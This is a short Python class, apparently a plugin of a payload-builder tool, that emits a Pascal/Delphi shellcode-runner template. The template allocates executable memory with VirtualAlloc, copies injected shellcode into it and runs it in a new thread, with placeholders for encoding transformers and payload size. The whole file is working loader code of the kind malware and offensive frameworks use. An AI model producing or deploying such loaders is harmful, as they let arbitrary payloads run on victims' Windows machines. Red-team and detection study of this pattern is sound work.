class shellcoderunner:
    def __init__(self, arguments):
        pass

    def imports(self) -> list[str]:
        return ['Classes', 'windows', 'sysutils']

    def compilerOptions(self) -> list[str]:
        return []

    def codeblocks(self) -> str:
        return """"""

    def template(self) -> str:
        return """
procedure main;
var
    shellcode : array of byte;
    hThread: Handle;
    addr: Pointer;
    ThreadId: LongWord;

begin
    
    {transformers}

    addr := VirtualAlloc(nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    CopyMemory(addr,shellcode,{shellcodeSize});
    hThread := CreateThread(nil, 0, addr, nil, 0, ThreadId);

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
end;
"""